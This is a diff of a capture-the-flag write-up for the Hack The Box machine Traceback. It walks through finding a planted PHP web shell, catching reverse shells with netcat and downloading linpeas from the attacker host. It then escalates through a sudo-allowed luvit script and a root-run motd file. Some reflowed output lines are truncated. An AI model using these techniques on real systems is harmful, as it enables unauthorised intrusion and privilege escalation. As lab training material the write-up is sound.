@@ -19,20 +19,21 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Going to the website at the IP address, we get a page saying that the site has been "owned" by a hacker and that a backdoor has been installed.
 
-
-
 ![Traceback home page](../.gitbook/assets/0%20%286%29.png)
 
 The source code of the page has a comment:
 
-&lt;!--Some of the best web shells that you might need ;\)--&gt;
+```bash
+<!--Some of the best web shells that you might need ;)-->
+```
 
 If we do an Internet search with this line, we get a Github site of Web-Shells in ASP, JSP and PHP \([https://github.com/TheBinitGhimire/Web-Shells\](https://github.com/TheBinitGhimire/Web-Shells\)\). We know from nmap that the machine is running Ubuntu and so is not going to be running ASP which is a Microsoft technology. We would also assume that if the site was running JSP, we might have picked up Tomcat when doing the nmap but it is running Apache. So we will assume that it is running PHP for the time being. We can run a gobuster directory scan and use a special wordlist from SecLists that has common backdoor shell names in it:
 
 ```bash
 ┌─[oztechmuse@parrot]─[~/boxes/Traceback]
-└──╼ $gobuster dir -t 50 -w /usr/share/SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -u 
-http://traceback.htb
+└──╼ $gobuster dir -t 50 \
+-w /usr/share/SecLists/Discovery/Web-Content/\
+CommonBackdoors-PHP.fuzz.txt -u http://traceback.htb
 
 <SNIP>
 /smevk.php (Status: 200)
@@ -64,7 +65,7 @@ $UserName = "admin"; //Your UserName here.
 $auth_pass = "admin"; //Your Password.
 //Change Shell Theme here//
 $color = "#8B008B"; //Fonts color modify here.
-$Theme = '#8B008B'; //Change border-color accoriding to your choice.
+$Theme = '#8B008B'; //Change border-color.
 $TabsColor = '#0E5061'; //Change tabs color here.
 #-------------------------------------------------------------------------------
 ?>
@@ -88,14 +89,14 @@ After logging in, we are presented with information that the shell has gathered 
 Starting a netcat listener on port 6001, we get a hit when the script is executed and we can then upgrade the shell
 
 ```bash
-webadmin@traceback:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash");'
-<ml$ python3 -c 'import pty;pty.spawn("/bin/bash");'
+webadmin@traceback:/var/www/html$ python3 \
+-c 'import pty;pty.spawn("/bin/bash");'
 webadmin@traceback:/var/www/html$ ^Z
 [1]+ Stopped nc -lvnp 6001
 ┌─[✗]─[rin@parrot]─[~/boxes/Traceback]
 └──╼ $stty raw -echo
 ┌─[rin@parrot]─[~/boxes/Traceback]
-nc -lvnp 6001
+└──╼ nc -lvnp 6001
 webadmin@traceback:/var/www/html$
 ```
 
@@ -167,8 +168,8 @@ Connecting to 10.10.14.117:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 299897 (293K) [text/x-sh]
 Saving to: 'linpeas.sh'
-linpeas.sh 100%[===================>] 292.87K 237KB/s in 1.2s
-2020-12-27 20:31:07 (237 KB/s) - 'linpeas.sh' saved [299897/299897]
+linpeas.sh 100%[===================>] in 1.2s
+2020-12-27 20:31:07 (237 KB/s) - 'linpeas.sh' sav
 webadmin@traceback:/dev/shm$ chmod a+x linpeas.sh
 webadmin@traceback:/dev/shm$ ./linpeas.sh -s > linpeas.out
 ```
@@ -181,7 +182,9 @@ Going through the output, the first we find is further evidence that webadmin ca
 https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
 
 Matching Defaults entries for webadmin on traceback:
-env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+env_reset, mail_badpass, 
+secure_path=/usr/local/sbin\:/usr/local/bin\
+:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 User webadmin may run the following commands on traceback:
 (sysadmin) NOPASSWD: /home/sysadmin/luvit
 ```
@@ -197,7 +200,8 @@ Enter same passphrase again:
 Your identification has been saved in sysadmin.key
 Your public key has been saved in sysadmin.key.pub
 The key fingerprint is:
-SHA256:Nc30lm7tE6QDKmKMUuVSwK1FKJXeLlA0jZ8lUdFCfnk rin@parrot
+SHA256:Nc30lm7tE6QDKmKMUuVSwK1FKJXeLlA0jZ8lUdFCfnk 
+rin@parrot
 <SNIP>
 ```
 
@@ -212,7 +216,8 @@ io.write("ssh-rsa … =")
 We can then run this script:
 
 ```bash
-webadmin@traceback:/dev/shm$ sudo -u sysadmin /home/sysadmin/luvit test.lua
+webadmin@traceback:/dev/shm$ sudo -u sysadmin \
+/home/sysadmin/luvit test.lua
 ```
 
 And then SSH onto the machine as sysadmin:
@@ -220,10 +225,14 @@ And then SSH onto the machine as sysadmin:
 ```bash
 ┌─[oztechmuse@parrot]─[~/boxes/Traceback]
 └──╼ $ssh -i sysadmin sysadmin@traceback.htb
-The authenticity of host 'traceback.htb (10.129.1.189)' can't be established.
-ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'traceback.htb,10.129.1.189' (ECDSA) to the list of known hosts.
+The authenticity of host 'traceback.htb (10.129.1.189)' 
+can't be established.
+ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJ
+vyQcAASWY9E/TlxoqxInU.
+Are you sure you want to continue connecting 
+(yes/no/[fingerprint])? yes
+Warning: Permanently added 'traceback.htb,10.129.1.189' 
+(ECDSA) to the list of known hosts.
 #################################
 -------- OWNED BY XH4H ---------
 I guess stuff could have been configured better ^^ -
@@ -239,7 +248,7 @@ Now that we are sysadmin and have got the flag in /home/sysadmin/user.txt, we ca
 ```bash
 [+] Interesting GROUP writable files (not in Home) (max 500)
 [i] 
-https://book.hacktricks.xyz/linux-unix/privilege-escalation#w
+https://book.hacktricks.xyz/linux-unix/privilege-escalation
 
 ritable-files
 Group sysadmin:
@@ -254,13 +263,26 @@ Group sysadmin:
 Before we investigate this more, let us use another tool to enumerate processes called pspy64 \([https://github.com/DominicBreuker/pspy\](https://github.com/DominicBreuker/pspy\)\). This will monitor processes and highlight when new processes run. When running it on Traceback, we see that every minute a set of processes run:
 
 ```bash
-2020/12/28 17:11:01 CMD: UID=0 PID=49845 | sleep 30
-2020/12/28 17:11:01 CMD: UID=0 PID=49844 | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/
-2020/12/28 17:11:01 CMD: UID=0 PID=49843 | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
-2020/12/28 17:11:01 CMD: UID=0 PID=49842 | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
-2020/12/28 17:11:01 CMD: UID=0 PID=49841 | /usr/sbin/CRON -f
-2020/12/28 17:11:01 CMD: UID=0 PID=49840 | /usr/sbin/CRON -f
-2020/12/28 17:11:31 CMD: UID=0 PID=49846 | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/
+2020/12/28 CMD: UID=0 PID=49845 | sleep 30
+2020/12/28 CMD: UID=0 PID=49844 | /bin/cp /var/backups
+    /.update-motd.d/00-header /var/backups/
+    .update-motd.d/10-help-text /var/backups/
+    .update-motd.d/50-motd-news /var/backups/
+    .update-motd.d/80-esm /var/backups/
+    .update-motd.d/91-release-upgrade /etc/update-motd.d/
+2020/12/28 CMD: UID=0 PID=49843 | /bin/sh -c /bin/cp 
+    /var/backups/.update-motd.d/* /etc/update-motd.d/
+2020/12/28 CMD: UID=0 PID=49842 | /bin/sh -c sleep 30 ; 
+    /bin/cp /var/backups/.update-motd.d/* 
+    /etc/update-motd.d/
+2020/12/28 CMD: UID=0 PID=49841 | /usr/sbin/CRON -f
+2020/12/28 CMD: UID=0 PID=49840 | /usr/sbin/CRON -f
+2020/12/28 CMD: UID=0 PID=49846 | /bin/cp /var/backups/
+    .update-motd.d/00-header /var/backups/
+    .update-motd.d/10-help-text /var/backups/
+    .update-motd.d/50-motd-news /var/backups/
+    .update-motd.d/80-esm /var/backups/
+    .update-motd.d/91-release-upgrade /etc/update-motd.d/
 ```
 
 Motd is "message of the day" and is a set of text files that are displayed to a user when they log in. Linux uses PAM \(Pluggable Authentication Modules\) to manage the authentication and login process. The module pam\_motd is the one responsible for displaying the messages to users logging in and before they get a shell.
@@ -268,27 +290,39 @@ Motd is "message of the day" and is a set of text files that are displayed to a 
 We can see what happens to the pspy output when we SSH in:
 
 ```bash
-2020/12/28 17:41:04 CMD: UID=0 PID=50208    | /usr/sbin/sshd -D -R
-2020/12/28 17:41:04 CMD: UID=106 PID=50209  | sshd: [net]
-2020/12/28 17:41:07 CMD: UID=0 PID=50211    | run-parts --lsbsysinit /etc/update-motd.d
-2020/12/28 17:41:07 CMD: UID=0 PID=50210    | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
-2020/12/28 17:41:07 CMD: UID=??? PID=50213  | ???
-2020/12/28 17:41:07 CMD: UID=0 PID=50214    | /bin/sh /etc/update-motd.d/50-motd-news
-2020/12/28 17:41:07 CMD: UID=0 PID=50218    | /bin/sh /etc/update-motd.d/50-motd-news
-2020/12/28 17:41:07 CMD: UID=0 PID=50217    |
-2020/12/28 17:41:07 CMD: UID=0 PID=50216    |
-2020/12/28 17:41:07 CMD: UID=0 PID=50215    |
-2020/12/28 17:41:07 CMD: UID=0 PID=50219    | /bin/sh /etc/update-motd.d/80-esm
-2020/12/28 17:41:07 CMD: UID=0 PID=50220    | /bin/sh /etc/update-motd.d/80-esm
-2020/12/28 17:41:07 CMD: UID=0 PID=50221    | /usr/bin/python3 -Es /usr/bin/lsb_release -ds
-2020/12/28 17:41:07 CMD: UID=0 PID=50222    | /bin/sh /etc/update-motd.d/91-release-upgrade
-2020/12/28 17:41:07 CMD: UID=0 PID=50225    | cut -d -f4
-2020/12/28 17:41:07 CMD: UID=0 PID=50224    | /usr/bin/python3 -Es /usr/bin/lsb_release -sd
-2020/12/28 17:41:07 CMD: UID=0 PID=50223    | /bin/sh /etc/update-motd.d/91-release-upgrade
-2020/12/28 17:41:07 CMD: UID=??? PID=50226  | ???
-2020/12/28 17:41:07 CMD: UID=0 PID=50227    | stat -c %Y /var/lib/ubuntu-release-upgrader/release-upgrade-available
-2020/12/28 17:41:07 CMD: UID=0 PID=50230    | sshd: sysadmin [priv]
-2020/12/28 17:41:08 CMD: UID=1001 PID=50231 | -sh
+CMD: UID=0 PID=50208    | /usr/sbin/sshd -D -R
+CMD: UID=106 PID=50209  | sshd: [net]
+CMD: UID=0 PID=50211    | run-parts --lsbsysinit 
+    /etc/update-motd.d
+CMD: UID=0 PID=50210    | sh -c /usr/bin/env 
+    -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
+    /usr/bin:/sbin:/bin run-parts 
+    --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+CMD: UID=??? PID=50213  | ???
+CMD: UID=0 PID=50214    | /bin/sh /etc/update-motd.d/
+    50-motd-news
+CMD: UID=0 PID=50218    | /bin/sh /etc/update-motd.d/
+    50-motd-news
+CMD: UID=0 PID=50217    |
+CMD: UID=0 PID=50216    |
+CMD: UID=0 PID=50215    |
+CMD: UID=0 PID=50219    | /bin/sh /etc/update-motd.d/80-esm
+CMD: UID=0 PID=50220    | /bin/sh /etc/update-motd.d/80-esm
+CMD: UID=0 PID=50221    | /usr/bin/python3 -Es 
+    /usr/bin/lsb_release -ds
+2CMD: UID=0 PID=50222    | /bin/sh 
+    /etc/update-motd.d/91-release-upgrade
+CMD: UID=0 PID=50225    | cut -d -f4
+CMD: UID=0 PID=50224    | /usr/bin/python3 -Es 
+    /usr/bin/lsb_release -sd
+CMD: UID=0 PID=50223    | /bin/sh 
+    /etc/update-motd.d/91-release-upgrade
+CMD: UID=??? PID=50226  | ???
+CMD: UID=0 PID=50227    | stat -c %Y 
+    /var/lib/ubuntu-release-upgrader/
+    release-upgrade-available
+CMD: UID=0 PID=50230    | sshd: sysadmin [priv]
+CMD: UID=1001 PID=50231 | -sh
 ```
 
 The most important thing hers is that we can see the scripts in the motd files being run by root. We should be able to modify one of the files and put in a reverse shell which will get called when we SSH in.
@@ -305,8 +339,9 @@ We start a netcat listener on our box listening on port 6002, write the motd fil
 ┌─[rin@parrot]─[~/boxes/Traceback]
 └──╼ $nc -lvnp 6002
 listening on [any] 6002 ...
-connect to [10.10.14.117] from (UNKNOWN) [10.129.1.189] 59966
-bash: cannot set terminal process group (50728): Inappropriate ioctl for device
+connect to [10.10.14.117] from (UNKNOWN) [10.129.1.189] 
+bash: cannot set terminal process group (50728): 
+    Inappropriate ioctl for device
 bash: no job control in this shell
 root@traceback:/# whoami
 whoami
